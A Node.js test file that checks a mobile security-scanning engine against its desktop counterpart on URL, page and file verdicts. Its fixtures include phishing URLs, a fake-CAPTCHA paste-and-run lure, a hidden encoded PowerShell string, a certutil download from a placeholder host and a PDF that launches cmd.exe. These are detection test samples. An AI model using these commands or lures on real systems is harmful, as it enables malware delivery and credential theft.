'use strict';
/**
 * The phone build must agree with the desktop build.
 *
 * mobile/shadow-engine.js is generated from the same source files, but it
 * substitutes its own Buffer, SHA-256, punycode and path implementations. If
 * any of those drift, the phone would quietly give different answers from the
 * desktop, which is worse than not shipping it at all.
 */

const { test } = require('node:test');
const assert = require('node:assert');
const crypto = require('node:crypto');
const path = require('node:path');

const { analyzeUrl } = require('../src/main/soc/heuristics/url-heuristics');
const { analyzeContent } = require('../src/main/soc/heuristics/content-heuristics');
const { decide } = require('../src/main/soc/scoring');
const { Blocklists } = require('../src/main/firewall/blocklists');
const { scanFile } = require('../src/main/sandbox/scanner');

require('../mobile/shadow-engine.js');
const E = globalThis.ShadowEngine;
const desktopLists = new Blocklists({});

function desktopUrlVerdict(url) {
  const signals = analyzeUrl(url);
  let host = '';
  try { host = new URL(url).hostname.toLowerCase(); } catch { /* malformed */ }
  if (host) {
    for (const hit of desktopLists.match(host, url)) {
      signals.push({ id: `blocklist.${hit.list}`, score: hit.score, severity: hit.severity, title: hit.title, detail: hit.detail });
    }
  }
  return decide(signals, {});
}

const URLS = [
  'https://www.google.com/search?q=weather',
  'http://paypal.com.secure-verify.tk/login/confirm-account',
  'https://micros0ft.com/login',
  'https://xn--80ak6aa92e.com/',
  'https://www.paypal.com@evil.tk/login',
  'http://127.0.0.1:8080/app',
  'https://doubleclick.net/pixel.gif',
  'https://en.wikipedia.org/wiki/Tor_(network)',
  'https://coinhive.com/lib/miner.js',
  'https://appleid.apple.com.verify-account.icu/signin/password',
  'https://cdn.jsdelivr.net/npm/pkg@1.2.3/dist/pkg.min.js',
  'javascript:alert(1)',
  'http://203.0.113.9:8081/account/login/verify',
];

test('phone and desktop reach the same verdict on every URL', () => {
  for (const url of URLS) {
    const d = desktopUrlVerdict(url);
    const p = E.checkUrl(url, {});
    assert.equal(p.verdict, d.verdict, `${url}: phone said ${p.verdict}, desktop said ${d.verdict}`);
    assert.equal(p.score, d.score, `${url}: phone scored ${p.score}, desktop scored ${d.score}`);
  }
});

test('phone and desktop reach the same verdict on page content', () => {
  const cases = [
    ['<title>Microsoft account sign in</title><form action="https://evil.tk/x"><input type="password"></form>',
      'https://login-verify.tk/'],
    ['<h1>Verify you are human</h1><p>Press Windows + R, then Ctrl+V and hit Enter.</p>',
      'https://captcha.top/'],
    ['<!doctype html><title>Recipes</title><h1>Bread</h1><p>Mix flour and water.</p>',
      'https://example.com/recipes'],
  ];
  for (const [html, url] of cases) {
    const d = decide([...analyzeUrl(url), ...analyzeContent(html, url)], {});
    const p = E.checkPage(html, url, {});
    assert.equal(p.verdict, d.verdict, `${url}: phone ${p.verdict} vs desktop ${d.verdict}`);
    assert.equal(p.score, d.score, `${url}: phone ${p.score} vs desktop ${d.score}`);
  }
});

test('the hand-written punycode decoder finds homographs without Node', () => {
  // Cyrillic lookalike of "apple". Without decoding, new URL() hands back the
  // xn-- form and the mixed-script check sees plain ASCII.
  const ids = E.analyzeUrl('https://xn--80ak6aa92e.com/').map((s) => s.id);
  assert.ok(ids.includes('url.punycode'), ids.join(','));
  assert.ok(ids.includes('url.mixed-script'), ids.join(','));
});

test('the hand-written SHA-256 matches Node for known vectors', () => {
  const vectors = ['', 'abc', 'The quick brown fox jumps over the lazy dog', 'a'.repeat(1000)];
  for (const v of vectors) {
    const expected = crypto.createHash('sha256').update(Buffer.from(v)).digest('hex');
    const actual = E.sha256(new TextEncoder().encode(v));
    assert.equal(actual, expected, `sha256("${v.slice(0, 20)}...")`);
  }
  // Block-boundary sizes, where padding bugs live.
  for (const n of [55, 56, 57, 63, 64, 65, 119, 120, 128]) {
    const buf = Buffer.alloc(n, 0x61);
    assert.equal(E.sha256(new Uint8Array(buf)), crypto.createHash('sha256').update(buf).digest('hex'),
      `sha256 of ${n} bytes`);
  }
});

// --- the file scanner --------------------------------------------------------

function buildPe(strings) {
  const dos = Buffer.alloc(0x80);
  dos.write('MZ', 0);
  dos.writeUInt32LE(0x80, 0x3c);
  const optSize = 0xe0;
  const sections = [['UPX0\0\0\0\0', 0x10000, 0, 0, 0xe0000080], ['UPX1\0\0\0\0', 0x1000, 0x200, 0x200, 0xe0000040]];
  const header = Buffer.alloc(24);
  header.write('PE\0\0', 0);
  header.writeUInt16LE(0x14c, 4);
  header.writeUInt16LE(sections.length, 6);
  header.writeUInt32LE(Math.floor(Date.now() / 1000) - 86400 * 400, 8);
  header.writeUInt16LE(optSize, 20);
  header.writeUInt16LE(0x102, 22);
  const opt = Buffer.alloc(optSize);
  opt.writeUInt16LE(0x10b, 0);
  const secBufs = sections.map(([name, vsz, rsz, rptr, flags]) => {
    const b = Buffer.alloc(40);
    b.write(name, 0, 'latin1');
    b.writeUInt32LE(vsz, 8); b.writeUInt32LE(0x1000, 12);
    b.writeUInt32LE(rsz, 16); b.writeUInt32LE(rptr, 20); b.writeUInt32LE(flags, 36);
    return b;
  });
  let out = Buffer.concat([dos, header, opt, ...secBufs]);
  out = Buffer.concat([out, Buffer.alloc(Math.max(0, 0x600 - out.length))]);
  return Buffer.concat([out, Buffer.from(strings || '', 'latin1'), Buffer.alloc(512)]);
}

test('the phone scanner identifies types by content, like the desktop', () => {
  const pe = buildPe();
  const r = E.scanBytes(new Uint8Array(pe), { name: 'invoice.pdf' });
  assert.equal(r.detectedType, 'pe');
  assert.equal(r.verdict, 'block', `scored ${r.score}: ${r.reasons.map((x) => x.title).join(', ')}`);
  assert.ok(r.signals.some((s) => s.id === 'file.type-mismatch'));
});

test('the phone scanner reaches the same verdict as the desktop scanner', async () => {
  const fs = require('node:fs');
  const os = require('node:os');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'shadow-mobile-'));

  const samples = [
    ['packed.exe', buildPe('powershell.exe -nop -w hidden -enc SQBFAFgA\0certutil -urlcache -f http://x/y\0')],
    ['photo.png', Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.alloc(2048, 0x11)])],
    ['notes.txt', Buffer.from('Shopping list\nmilk\nbread\n')],
    ['statement.pdf', Buffer.from('%PDF-1.4\n<</OpenAction<</S/JavaScript/JS(x())>>>>\n<</S/Launch/F(cmd.exe)>>')],
  ];

  for (const [name, bytes] of samples) {
    const p = path.join(dir, name);
    fs.writeFileSync(p, bytes);
    const desktop = decide((await scanFile(p, { originalName: name })).signals, {});
    const phone = E.scanBytes(new Uint8Array(bytes), { name });
    assert.equal(phone.verdict, desktop.verdict,
      `${name}: phone ${phone.verdict}/${phone.score}, desktop ${desktop.verdict}/${desktop.score}`);
  }
  fs.rmSync(dir, { recursive: true, force: true });
});

test('the phone scanner hashes files the same way', async () => {
  const bytes = buildPe('marker');
  const phone = E.scanBytes(new Uint8Array(bytes), { name: 'x.bin' });
  assert.equal(phone.hashes.sha256, crypto.createHash('sha256').update(bytes).digest('hex'));
});

test('the phone build says plainly what it cannot do', () => {
  const pdf = Buffer.from('%PDF-1.4\n<</OpenAction<</S/JavaScript/JS(x())>>>>');
  const r = E.scanBytes(new Uint8Array(pdf), { name: 'a.pdf' });
  assert.equal(E.pdfStreamsInspected, false);
  assert.ok(r.limitations.length > 0, 'a PDF scan must declare the deflate limitation');
  assert.match(r.limitations[0], /inflate|decompress/i);
});

test('a clean file stays clean on the phone', () => {
  const png = Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.alloc(4096, 7)]);
  const r = E.scanBytes(new Uint8Array(png), { name: 'holiday.png' });
  assert.equal(r.verdict, 'allow');
  assert.equal(r.detectedType, 'png');
});

test('the bundle is regenerated from current source, not stale', () => {
  const fs = require('node:fs');
  const bundle = fs.readFileSync(path.join(__dirname, '..', 'mobile', 'shadow-engine.js'), 'utf8');
  // A marker that only exists in the current url-heuristics source.
  assert.match(bundle, /pronounceability/, 'bundle predates the pronounceability check');
  assert.match(bundle, /isLocalAddress/, 'bundle predates the local-address fix');
});
